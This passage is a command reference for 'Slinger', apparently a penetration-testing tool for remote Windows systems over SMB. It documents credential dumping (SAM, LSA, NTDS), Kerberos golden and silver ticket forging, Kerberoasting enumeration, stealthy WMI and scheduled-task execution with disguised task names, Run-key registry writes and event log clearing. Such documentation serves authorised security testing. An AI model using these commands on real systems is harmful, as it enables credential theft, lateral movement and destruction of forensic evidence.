**Example Usage:**
```
Example Usage: rm file.txt, rm -n 'file1.txt file2.txt file3.txt'
```

### Arguments

- **`remote_path`**: Specify the remote file path to delete
  - Required: No

- **`file_list`**: Space-separated list of files to delete (quoted)
  - Required: No

---

## `#shell`

**Description:** Enter local terminal mode for command execution

**Help:**
```
usage: #shell [-h]
Enter local terminal mode for command execution
```

**Example Usage:**
```
Example Usage: #shell
```

---

## `!`

**Description:** Run a specified local command

**Help:**
```
usage: ! [-h] ...
Run a specified local command
```

**Example Usage:**
```
Example Usage: ! ls -l
```

### Arguments

- **`commands`**: Specify the local commands to run
  - Required: No

---

## `info`

**Description:** Display the status of the current session

**Help:**
```
usage: info [-h]
Display the status of the current session
```

**Example Usage:**
```
Example Usage: info
```

---

## `history`

**Description:** Display recent command history from the slinger history file

**Help:**
```
usage: history [-h] [-n NUM]
Display recent command history from the slinger history file
```

**Example Usage:**
```
Example Usage: history, history -n 20
```

### Arguments

- **`n`**: Number of history lines to display (default: 15)
  - Default: `15`
  - Required: No

---

## `reguse`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
usage: reguse [-h]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstart`

**Description:** Connect to a remote registry on the remote server

**Help:**
```
usage: reguse [-h]
Connect to a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: reguse
```

---

## `regstop`

**Description:** Disconnect from a remote registry on the remote server

**Help:**
```
usage: regstop [-h]
Disconnect from a remote registry on the remote server
```

**Example Usage:**
```
Example Usage: regstop
```

---

## `regquery`

**Description:** Query a registry key on the remote server

**Help:**
```
usage: regquery [-h] [-l] [-v] key
Query a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regquery HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run (You must use two slashes or quotes)
```

### Arguments

- **`key`**: Specify the registry key to query
  - Required: Yes

---

## `regset`

**Description:** Set a registry value on the remote server

**Help:**
```
usage: regset [-h] -k KEY -v VALUE -d DATA [-t TYPE]
Set a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regset -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test -d "C:\test.exe"
```

### Arguments

- **`key`**: Specify the registry key to set
  - Required: Yes

- **`value`**: Specify the registry value to set
  - Required: Yes

- **`data`**: Specify the registry data to set
  - Required: Yes

- **`type`**: Specify the registry type to set
  - Default: `REG_SZ`
  - Required: No

---

## `regdel`

**Description:** Delete a registry value on the remote server

**Help:**
```
usage: regdel [-h] -k KEY [-v VALUE]
Delete a registry value on the remote server
```

**Example Usage:**
```
Example Usage: regdel -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ -v test
```

### Arguments

- **`key`**: Specify the registry key to delete
  - Required: Yes

- **`value`**: Specify the registry value to delete
  - Required: No

---

## `regcreate`

**Description:** Create a registry key on the remote server

**Help:**
```
usage: regcreate [-h] key
Create a registry key on the remote server
```

**Example Usage:**
```
Example Usage: regcreate -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to create
  - Required: Yes

---

## `regcheck`

**Description:** Check if a registry key exists on the remote server. This is really just an exposed helper function.

**Help:**
```
usage: regcheck [-h] key
Check if a registry key exists on the remote server. This is really just an exposed helper function.
```

**Example Usage:**
```
Example Usage: regcheck HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test
```

### Arguments

- **`key`**: Specify the registry key to check
  - Required: Yes

---

## `regsearch`

**Description:** Recursively search registry for keys and values matching a pattern

**Help:**
```
usage: regsearch [-h] [-k KEY] [--maxdepth MAXDEPTH] [--values]
                 [--limit LIMIT] [--format {table,json}]
                 pattern
Recursively search registry for keys and values matching a pattern
```

**Example Usage:**
```
Examples:
  regsearch "Python" -k "HKLM\SOFTWARE"
  regsearch "Spooler" -k "HKLM\SYSTEM\CurrentControlSet\Services" --values
  regsearch "Run" -k "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" --maxdepth 3
  regsearch "password" -k "HKLM\SOFTWARE" --values --format json
```

### Arguments

- **`pattern`**: Search pattern (case-insensitive substring match)
  - Required: Yes

- **`key`**: Root key to search from
  - Default: `HKLM\SOFTWARE`
  - Required: No

- **`maxdepth`**: Maximum recursion depth
  - Default: `5`
  - Required: No

- **`limit`**: Maximum results to return
  - Default: `100`
  - Required: No

- **`format`**: Output format
  - Choices: table, json
  - Default: `table`
  - Required: No

---

## `portfwd`

**Description:** Forward a local port to a remote port on the remote server

**Help:**
```
usage: portfwd [-h] (-d | -a | -l | -c | --load) local remote
Forward a local port to a remote port on the remote server
```

**Example Usage:**
```
Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]
```

### Arguments

- **`local`**: Specify the local host and port to forward from
  - Required: Yes

- **`remote`**: Specify the remote host and port to forward to
  - Required: Yes

---

## `ifconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
usage: ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `ipconfig`

**Description:** Display network interfaces on the remote server

**Help:**
```
usage: ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `enuminterfaces`

**Description:** Display network interfaces on the remote server

**Help:**
```
usage: ifconfig [-h]
Display network interfaces on the remote server
```

**Example Usage:**
```
Example Usage: ifconfig
```

---

## `hostname`

**Description:** Display the hostname of the remote server

**Help:**
```
usage: hostname [-h]
Display the hostname of the remote server
```

**Example Usage:**
```
Example Usage: hostname
```

---

## `procs`

**Description:** List running processes on the remote server

**Help:**
```
usage: procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `ps`

**Description:** List running processes on the remote server

**Help:**
```
usage: procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `tasklist`

**Description:** List running processes on the remote server

**Help:**
```
usage: procs [-h] [-v] [-t]
List running processes on the remote server
```

**Example Usage:**
```
Example Usage: procs -t -v
```

---

## `fwrules`

**Description:** Display firewall rules on the remote server

**Help:**
```
usage: fwrules [-h]
Display firewall rules on the remote server
```

**Example Usage:**
```
Example Usage: fwrules
```

---

## `set`

**Description:** Set a variable for use in the application

**Help:**
```
usage: set [-h] varname [value]
Set a variable for use in the application
```

**Example Usage:**
```
Example Usage: set varname value
```

### Arguments

- **`varname`**: Set the debug variable to True or False
  - Required: Yes

- **`value`**: Set the mode variable to True or False
  - Default: ``
  - Required: No

---

## `config`

**Description:** Show the current config

**Help:**
```
usage: config [-h]
Show the current config
```

**Example Usage:**
```
Example Usage: config
```

---

## `run`

**Description:** Run a slinger script or command sequence

**Help:**
```
usage: run [-h] (-c CMD_CHAIN | -f FILE)
Run a slinger script or command sequence
```

**Example Usage:**
```
Example Usage: run -c "use C$;cd Users;cd Administrator;cd Downloads;ls"
```

### Arguments

- **`cmd_chain`**: Specify a command sequence to run
  - Required: No

- **`file`**: Specify a script file to run
  - Required: No

---

## `secretsdump`

**Description:** Extract credentials using the existing SMB session. Supports SAM hashes, LSA secrets (cached domain creds, service passwords), and NTDS.dit (domain controllers only via DRS replication).

**Help:**
```
usage: secretsdump [-h] [--sam] [--lsa] [--ntds] [--just-dc-ntlm] [--history]
                   [-o OUTPUT] [--tmp-path PATH]
Extract credentials using the existing SMB session. Supports SAM hashes, LSA secrets (cached domain creds, service passwords), and NTDS.dit (domain controllers only via DRS replication).
```

**Example Usage:**
```
Examples:
  secretsdump                          # Dump SAM + LSA (default)
  secretsdump --sam                    # SAM hashes only
  secretsdump --lsa                    # LSA secrets only (cached creds, service passwords)
  secretsdump --ntds                   # NTDS.dit via DRS replication (DC only)
  secretsdump --ntds --just-dc-ntlm   # NTDS NTLM hashes only (faster)
  secretsdump --history                # Include password history
  secretsdump -o /tmp/hashes.txt       # Save output to file
  hashdump                             # Alias for secretsdump --sam
```

### Arguments

- **`output`**: Save extracted secrets to file
  - Required: No

- **`tmp_path`**: Absolute disk path for temporary hive files (default: auto per share). Must be writable by SYSTEM and accessible from the connected share
  - Required: No

---

## `hashdump`

**Description:** Extract credentials using the existing SMB session. Supports SAM hashes, LSA secrets (cached domain creds, service passwords), and NTDS.dit (domain controllers only via DRS replication).

**Help:**
```
usage: secretsdump [-h] [--sam] [--lsa] [--ntds] [--just-dc-ntlm] [--history]
                   [-o OUTPUT] [--tmp-path PATH]
Extract credentials using the existing SMB session. Supports SAM hashes, LSA secrets (cached domain creds, service passwords), and NTDS.dit (domain controllers only via DRS replication).
```

**Example Usage:**
```
Examples:
  secretsdump                          # Dump SAM + LSA (default)
  secretsdump --sam                    # SAM hashes only
  secretsdump --lsa                    # LSA secrets only (cached creds, service passwords)
  secretsdump --ntds                   # NTDS.dit via DRS replication (DC only)
  secretsdump --ntds --just-dc-ntlm   # NTDS NTLM hashes only (faster)
  secretsdump --history                # Include password history
  secretsdump -o /tmp/hashes.txt       # Save output to file
  hashdump                             # Alias for secretsdump --sam
```

### Arguments

- **`output`**: Save extracted secrets to file
  - Required: No

- **`tmp_path`**: Absolute disk path for temporary hive files (default: auto per share). Must be writable by SYSTEM and accessible from the connected share
  - Required: No

---

## `spnenum`

**Description:** Query SPNs from the domain for Kerberoasting / silver ticket targets

**Help:**
```
usage: spnenum [-h] --method {atexec,wmiexec} [--query QUERY] [--sp PATH]
               [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
               [-w SECS]
Query SPNs from the domain for Kerberoasting / silver ticket targets
```

**Example Usage:**
```
Examples:
  spnenum --method atexec                    # List all SPNs via Task Scheduler
  spnenum --method atexec --query "*/FOREST" # SPNs matching pattern
  spnenum --method wmiexec                   # List all SPNs via WMI DCOM
  spnenum --method atexec --query "MSSQLSvc/*"  # Find SQL Server SPNs

Methods:
  atexec   - Runs 'setspn -Q' as SYSTEM via Task Scheduler. Requires share connection.
  wmiexec  - Runs 'setspn -Q' as SYSTEM via WMI DCOM. Requires DCOM ports.

Note: Both methods save output to a temp file on target and retrieve it via SMB.
      --sp should be reachable from the connected share.
```

### Arguments

- **`method`**: Enumeration method: atexec (Task Scheduler) or wmiexec (WMI DCOM)
  - Choices: atexec, wmiexec
  - Required: Yes

- **`query`**: SPN query pattern (default: */* for all SPNs)
  - Default: `*/*`
  - Required: No

- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
  - Required: No

- **`sn`**: Filename for command output (default: random)
  - Required: No

- **`tn`**: Scheduled task name (default: auto-generated)
  - Required: No

- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
  - Required: No

- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
  - Required: No

- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
  - Required: No

- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

## `ticket`

**Description:** Forge Kerberos tickets using extracted hashes. Golden tickets use the krbtgt hash (full domain access). Silver tickets use a service account hash (access to specific service).

**Help:**
```
usage: ticket [-h] {golden,silver} ...
Forge Kerberos tickets using extracted hashes. Golden tickets use the krbtgt hash (full domain access). Silver tickets use a service account hash (access to specific service).
```

**Example Usage:**
```
Examples:
  ticket golden --nthash <krbtgt_hash>                         # Golden ticket as Administrator
  ticket golden --nthash <hash> --user svc_admin --user-id 1001
  ticket golden --aesKey <aes256_key> --domain htb.local
  ticket silver --nthash <machine_hash> --spn cifs/dc01.htb.local
  ticket silver --nthash <hash> --spn http/web01.htb.local --user admin

Note: Domain SID auto-fetched via SAMR if not provided.
      Requires krbtgt hash (golden) or service account hash (silver) from secretsdump --ntds.
```

### Subcommands

#### `ticket golden`

**Description:** Forge a TGT using the krbtgt NTLM hash or AES key. Grants full domain access as any user.

**Help:**
```
usage: ticket golden [-h] [--nthash NTHASH] [--aesKey AESKEY]
                     [--domain DOMAIN] [--domain-sid DOMAIN_SID] [--user USER]
                     [--user-id USER_ID] [--groups GROUPS]
                     [--extra-sid EXTRA_SID] [--duration DURATION] [-o OUTPUT]
Forge a TGT using the krbtgt NTLM hash or AES key. Grants full domain access as any user.
```

**Example Usage:**
```
Examples:
  ticket golden --nthash <krbtgt_hash>
  ticket golden --nthash <hash> --user svc_admin --user-id 1001
  ticket golden --aesKey <aes256> --groups "513, 512, 520, 518, 519"
  ticket golden --nthash <hash> --extra-sid S-1-5-21-...-519 -o admin.ccache
```

##### Arguments

- **`nthash`**: krbtgt NTLM hash for ticket signing
- **`aesKey`**: krbtgt AES key (128 or 256 bit) for ticket signing
- **`domain`**: Domain FQDN (default: session domain)
- **`domain_sid`**: Domain SID (auto-fetched if not provided)
- **`user`**: User to impersonate (default: Administrator)
  - Default: `Administrator`
- **`user_id`**: User RID (default: 500)
  - Default: `500`
- **`groups`**: Group RIDs (default: Domain Users, Domain Admins, etc.)
  - Default: `513, 512, 520, 518, 519`
- **`extra_sid`**: Extra SID to add to ticket (for cross-domain)
- **`duration`**: Ticket duration in hours (default: 87600 = 10 years)
  - Default: `87600`
- **`output`**: Output ccache file path (default: ~/.slinger/<user>.ccache)
  - Required: No

---

#### `ticket silver`

**Description:** Forge a TGS for a specific service using the service account's NTLM hash or AES key.

**Help:**
```
usage: ticket silver [-h] [--nthash NTHASH] [--aesKey AESKEY] --spn SPN
                     [--domain DOMAIN] [--domain-sid DOMAIN_SID] [--user USER]
                     [--user-id USER_ID] [-o OUTPUT]
Forge a TGS for a specific service using the service account's NTLM hash or AES key.
```

**Example Usage:**
```
Examples:
  ticket silver --nthash <machine_hash> --spn cifs/dc01.htb.local
  ticket silver --nthash <hash> --spn http/web01.htb.local --user admin
  ticket silver --aesKey <aes256> --spn ldap/dc01.htb.local
```

##### Arguments

- **`nthash`**: Service account NTLM hash for ticket signing
- **`aesKey`**: Service account AES key (128 or 256 bit)
- **`spn`**: Target SPN (e.g., cifs/dc01.domain.com)
- **`domain`**: Domain FQDN (default: session domain)
- **`domain_sid`**: Domain SID (auto-fetched if not provided)
- **`user`**: User to impersonate (default: Administrator)
  - Default: `Administrator`
- **`user_id`**: User RID (default: 500)
  - Default: `500`
- **`output`**: Output ccache file path (default: ~/.slinger/<user>.ccache)
  - Required: No

---

## `env`

**Description:** Display environment variables on the remote server

**Help:**
```
usage: env [-h]
Display environment variables on the remote server
```

**Example Usage:**
```
Example Usage: env
```

---

## `debug-availcounters`

**Description:** Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.

**Help:**
```
usage: debug-availcounters [-h] [-f FILTER] [-p] [-s filename]
Display available performance counters on the remote server. This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: availcounters
```

### Arguments

- **`filter`**: Simple filter for case insenstive counters containing a given string
  - Required: No

- **`save`**: Save the available counters to a file
  - Required: No

---

## `debug-counter`

**Description:** Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.

**Help:**
```
usage: debug-counter [-h] [-c COUNTER] [-a {x86,x64,unk}] [-i]
Display a performance counter on the remote server. This is for debug use only, it doesn't really give you anything.
```

**Example Usage:**
```
Example Usage: counter -c 123 [-a x86]
```

### Arguments

- **`counter`**: Specify the counter to display
  - Required: No

- **`arch`**: Specify the architecture of the remote server
  - Choices: x86, x64, unk
  - Default: `unk`
  - Required: No

---

## `network`

**Description:** Display network information on the remote server

**Help:**
```
usage: network [-h] [--tcp] [--rdp]
Display network information on the remote server
```

**Example Usage:**
```
Example Usage: network
```

---

## `atexec`

**Description:** Execute a command on the remote server

**Help:**
```
usage: atexec [-h] -c COMMAND [--sp SP] [--sn SN] [--tn TN] [--ta TA]
              [--td TD] [--tf TF] [--no-output] [-i] [-w WAIT]
Execute a command on the remote server
```

**Example Usage:**
```
Example Usage: atexec -tn "NetSvc" -sp \\Users\\Public\\Downloads\\ -c ipconfig
For multi-word commands: atexec -c "echo hello world" -tn MyTask

Note: Output is saved to a temp file on target and retrieved via SMB.
--sp should be reachable from the connected share (auto-adjusted per share type).
```

### Arguments

- **`command`**: Specify the command to execute. For commands with spaces, wrap in quotes (e.g., 'echo hello world')
  - Required: Yes

- **`sp`**: Folder to save output file (default: auto per share, e.g., \Temp\ on ADMIN$)
  - Default: `\Users\Public\Downloads\`
  - Required: No

- **`sn`**: Specify the name of the output file.  Default is <random 8-10 chars>.txt
  - Required: No

- **`tn`**: Specify the name of the scheduled task (default: auto-generated)
  - Required: No

- **`ta`**: Specify the author of the scheduled task
  - Default: `Slinger`
  - Required: No

- **`td`**: Specify the description of the scheduled task
  - Default: `Scheduled task created by Slinger`
  - Required: No

- **`tf`**: Specify the folder to run the task in
  - Default: `\Windows`
  - Required: No

- **`wait`**: Seconds to wait for the task to complete
  - Default: `1`
  - Required: No

---

## `reload`

**Description:** Reload the current sessions context

**Help:**
```
usage: reload [-h]
Reload the current sessions context
```

**Example Usage:**
```
Example Usage: reload
```

---

## `plugins`

**Description:** List available plugins

**Help:**
```
usage: plugins [-h]
List available plugins
```

**Example Usage:**
```
Example Usage: plugins
```

---

## `changes`

**Description:** Display audit trail of all write operations this session

**Help:**
```
usage: changes [-h] [--category {FILE,SERVICE,TASK,REGISTRY,AGENT,EXEC}]
               [--save] [--clear]
Display audit trail of all write operations this session
```

**Example Usage:**
```
Example Usage: changes | changes --category FILE | changes --save
```

### Arguments

- **`category`**: Filter by change category
  - Choices: FILE, SERVICE, TASK, REGISTRY, AGENT, EXEC
  - Required: No

---

## `downloads`

**Description:** Manage resume download states and cleanup

**Help:**
```
usage: downloads [-h] {list,cleanup} ...
Manage resume download states and cleanup
```

**Example Usage:**
```
Example Usage: downloads list
```

### Subcommands

#### `downloads list`

**Description:** Display all active resumable downloads with progress

**Help:**
```
usage: downloads list [-h]
Display all active resumable downloads with progress
```

  - Required: No

---

#### `downloads cleanup`

**Description:** Remove completed, stale, or corrupted download state files

**Help:**
```
usage: downloads cleanup [-h] [--max-age MAX_AGE] [--force]
Remove completed, stale, or corrupted download state files
```

##### Arguments

- **`max_age`**: Remove state files older than N days
  - Default: `7`
  - Required: No

---

## `eventlog`

**Description:** Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog

**Help:**
```
usage: eventlog [-h] {query,list,check,clear,status} ...
Query Windows Event Logs via RPC over SMB named pipe \pipe\eventlog
```

**Example Usage:**
```
Examples:
  eventlog status                                                     # Check if eventlog pipe exists
  eventlog list --method rpc                                          # List available event logs
  eventlog check --method rpc --log System                            # Check if a log exists
  eventlog query --method rpc --log System --last 30 --limit 10       # Query via RPC
  eventlog query --method atexec --log System --limit 10              # Query via Task Scheduler
  eventlog query --method rpc --log System --format json -o events.json  # Export to JSON
  eventlog clear --method atexec --log Application --force            # Clear via Task Scheduler
  eventlog clear --method wmiexec --log System --force                # Clear via WMI DCOM
```

### Subcommands

#### `eventlog query`

**Description:** Query Windows Event Log entries with filtering and export

**Help:**
```
usage: eventlog query [-h] --method {rpc,atexec,wmiexec} --log LOG [--id ID]
                      [--type {error,warning,information,success,failure}]
                      [--since SINCE] [--last MINUTES] [--limit LIMIT]
                      [--source SOURCE] [--find FIND]
                      [--format {table,json,list,csv}] [-o OUTPUT] [--verbose]
                      [--order {newest,oldest}] [--sp PATH] [--sn NAME]
                      [--tn NAME] [--ta AUTHOR] [--td DESC] [--tf FOLDER]
                      [-w SECS]
Query Windows Event Log entries with filtering and export
```

**Example Usage:**
```
Examples:
  eventlog query --method rpc --log System --last 30 --limit 10
  eventlog query --method rpc --log Application --level error --limit 20
  eventlog query --method rpc --log Security --find 'failed logon' --limit 20
  eventlog query --method rpc --log System --format json -o events.json
  eventlog query --method rpc --log System --format csv -o events.csv
  eventlog query --method atexec --log Security --limit 50
  eventlog query --method wmiexec --log System --limit 10

Methods:
  rpc      - Query via \pipe\eventlog RPC (default, fastest)
  atexec   - Query via 'wevtutil qe' as SYSTEM through Task Scheduler
  wmiexec  - Query via 'wevtutil qe' as SYSTEM through WMI DCOM
```

##### Arguments

- **`method`**: Query method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
  - Choices: rpc, atexec, wmiexec
- **`log`**: Event log name (System, Application, Security, etc.)
- **`id`**: Specific event ID to filter
- **`level`**: Event level to filter
  - Choices: error, warning, information, success, failure
- **`since`**: Events since date (YYYY-MM-DD or 'YYYY-MM-DD HH:MM:SS')
- **`last`**: Events from the last X minutes
- **`limit`**: Maximum number of events to return
  - Default: `10`
- **`source`**: Filter by event source name
- **`find`**: Search for string in event content
- **`format`**: Output format (default: list)
  - Choices: table, json, list, csv
  - Default: `list`
- **`output`**: Save output to file
- **`order`**: Order events by newest first (default) or oldest first
  - Choices: newest, oldest
  - Default: `newest`
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `eventlog list`

**Description:** List all available event logs on the remote system

**Help:**
```
usage: eventlog list [-h] --method {rpc,atexec,wmiexec} [--sp PATH]
                     [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
                     [--tf FOLDER] [-w SECS]
List all available event logs on the remote system
```

**Example Usage:**
```
Examples:
  eventlog list --method rpc                                 # List via RPC pipe
  eventlog list --method atexec                              # List via Task Scheduler (wevtutil)
  eventlog list --method wmiexec                             # List via WMI DCOM (wevtutil)
```

##### Arguments

- **`method`**: Method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
  - Choices: rpc, atexec, wmiexec
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `eventlog check`

**Description:** Check if a specific Windows Event Log exists and is accessible

**Help:**
```
usage: eventlog check [-h] --method {rpc,atexec,wmiexec} --log LOG [--sp PATH]
                      [--sn NAME] [--tn NAME] [--ta AUTHOR] [--td DESC]
                      [--tf FOLDER] [-w SECS]
Check if a specific Windows Event Log exists and is accessible
```

**Example Usage:**
```
Examples:
  eventlog check --method rpc --log System                   # Check via RPC pipe
  eventlog check --method atexec --log Security              # Check via Task Scheduler (wevtutil)
  eventlog check --method wmiexec --log Application          # Check via WMI DCOM (wevtutil)
```

##### Arguments

- **`method`**: Method: rpc (\pipe\eventlog), atexec (Task Scheduler), or wmiexec (WMI DCOM)
  - Choices: rpc, atexec, wmiexec
- **`log`**: Event log name to check (can include custom paths)
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `eventlog clear`

**Description:** Clear all events from a Windows Event Log (cannot be undone)

**Help:**
```
usage: eventlog clear [-h] --log LOG --method {rpc,atexec,wmiexec} [--force]
                      [--sp PATH] [--sn NAME] [--tn NAME] [--ta AUTHOR]
                      [--td DESC] [--tf FOLDER] [-w SECS]
Clear all events from a Windows Event Log (cannot be undone)
```

**Example Usage:**
```
Examples:
  eventlog clear --log System --method atexec --force        # wevtutil as SYSTEM via Task Scheduler
  eventlog clear --log Application --method wmiexec --force  # wevtutil as SYSTEM via WMI DCOM
  eventlog clear --log Security --method rpc --force         # RPC via \pipe\eventlog (needs elevated privs)

Methods:
  rpc      - Direct RPC via \pipe\eventlog. Requires SE_SECURITY_PRIVILEGE (fails with UAC filtering)
  atexec   - Runs 'wevtutil cl' as SYSTEM via Task Scheduler. Requires share connection. Leaves Event ID 1102
  wmiexec  - Runs 'wevtutil cl' as SYSTEM via WMI DCOM. Requires DCOM ports (135+dynamic). Leaves Event ID 1102

Note: atexec/wmiexec save output to a temp file on target and retrieve it via SMB.
      --sp should be reachable from the connected share.
```

##### Arguments

- **`log`**: Event log name to clear
- **`method`**: Clearing method: rpc, atexec (Task Scheduler), or wmiexec (WMI DCOM)
  - Choices: rpc, atexec, wmiexec
- **`sp`**: Directory on target to save command output (default: auto per share). Should be reachable from the connected share
  - Default: `\Users\Public\Downloads\`
- **`sn`**: Filename for command output (default: random)
- **`tn`**: Scheduled task name (default: auto-generated)
- **`ta`**: Task author for OPSEC (default: Slinger)
  - Default: `Slinger`
- **`td`**: Task description for OPSEC (default: Slinger Task)
  - Default: `Slinger Task`
- **`tf`**: Task Scheduler folder (default: \Windows)
  - Default: `\Windows`
- **`wait`**: Seconds to wait for task completion (default: 2)
  - Default: `2`
  - Required: No

---

#### `eventlog status`

**Description:** Check IPC$ pipes for eventlog service availability

**Help:**
```
usage: eventlog status [-h]
Check IPC$ pipes for eventlog service availability
```

**Example Usage:**
```
Examples:
  eventlog status                  # Check if \pipe\eventlog exists in IPC$
```

  - Required: No

---

## `wmiexec`

**Description:** Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.

**Help:**
```
usage: wmiexec [-h] [--endpoint-info] METHOD ...
Execute commands on the remote system using various WMI execution methods. Each method has different capabilities, stealth levels, and requirements.
```

**Example Usage:**
```
Available Methods:
  dcom     - Traditional Win32_Process.Create via DCOM
  event    - WMI Event Consumer (stealthy)
  query    - Execute WQL queries

Example Usage:
  wmiexec dcom 'systeminfo'                # Traditional DCOM
  wmiexec event 'net user' --trigger-delay 5  # Event consumer
  wmiexec query 'SELECT * FROM Win32_Process'  # WQL query
```

### Subcommands

#### `wmiexec dcom`

**Description:** Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.

**Help:**
```
usage: wmiexec dcom [-h] [-c COMMAND] [-i] [--timeout TIMEOUT]
                    [--output filename] [--no-output]
                    [--sleep-time SLEEP_TIME] [--sp PATH] [--sn NAME]
                    [--raw-command] [--shell {cmd,powershell}]
Execute commands using traditional WMI Win32_Process.Create method via DCOM. Requires DCOM connectivity (ports 135 + dynamic range). May be blocked by firewalls.
```

**Example Usage:**
```
Command Wrappers:
  DEFAULT: cmd.exe /Q /c "command"     # Standard Windows command
  execution
  --raw-command: command               # No wrapper, execute directly
  --shell powershell: powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -NonInteractive -NoLogo -Command "command"

Raw Command Usage:
  Use --raw-command when you want to execute commands WITHOUT the cmd.exe wrapper:

  Standard (with cmd.exe wrapper):
    wmiexec dcom -c "whoami"              # Executes: cmd.exe /Q /c whoami
    wmiexec dcom -c "dir C:\"            # Executes: cmd.exe /Q /c dir C:
  Raw (no wrapper):
    wmiexec dcom -c "whoami" --raw-command              # Executes: whoami (directly)
    wmiexec dcom -c "calc.exe" --raw-command             # Executes: calc.exe (directly)

  Output control:
    wmiexec dcom -c "whoami" --no-output                 # Execute without capturing output
    wmiexec dcom -c "whoami" --sp "C:\Users\Public"    # Custom save path for output file
    wmiexec dcom -c "whoami" --sn myoutput.txt           # Custom output filename

Interactive Mode:
  wmiexec dcom -i                        # Start interactive DCOM shell
  wmiexec dcom -i --output session.txt   # Save session log to local file
  wmiexec dcom -i --sp "C:\Users\Public" --sn out.txt    # Custom remote output path/name per command
  wmiexec dcom -i --shell powershell                       # Interactive PowerShell shell

Note: WMI working directory syncs with SMB 'cd'. Use 'cd' to change directory before running commands.
      Output is saved to a temp file on target and retrieved via SMB.
      --sp must be a path reachable from the connected share (e.g., \Temp\ on ADMIN$).
```

##### Arguments

- **`command`**: Command to execute (not required for --interactive mode)
- **`timeout`**: Command execution timeout in seconds
  - Default: `30`
- **`output`**: Save command output to local file
- **`sleep_time`**: Sleep time before capturing output in seconds
  - Default: `1.0`
- **`save_path`**: Directory on target to save output file (default: auto per share). Should be reachable from the connected share
- **`save_name`**: Custom filename for remote output capture (default: auto-generated)
- **`shell`**: Shell to use for command execution
  - Choices: cmd, powershell
  - Default: `cmd`
  - Required: No

---

#### `wmiexec event`

**Description:** Execute commands using WMI Event Consumers (highest stealth method).

Examples:
  # Basic usage
  wmiexec event "whoami"

  # Raw command mode (direct CommandLineTemplate)
  wmiexec event "calc.exe" --raw-command                         # ExecutablePath: cmd.exe
  wmiexec event "whoami" --raw-exec ""                           # ExecutablePath: None (blank)
  wmiexec event "Get-Process" --raw-exec "powershell.exe"        # ExecutablePath: powershell.exe

  # Custom artifacts for stealth
  wmiexec event "whoami" --exe pwsh --cname "UpdateConsumer" --fname "MaintenanceFilter" \
    --script-name "check_system" --upload-path "C:\Windows\System32\check_system.ps1" \
    -o "C:\Windows\Logs\system_check.log" --trigger-exe "svchost.exe"

  # With local save
  wmiexec event "systeminfo" -o "C:\temp\info.txt" --save "./sysinfo.txt"


**Help:**
```
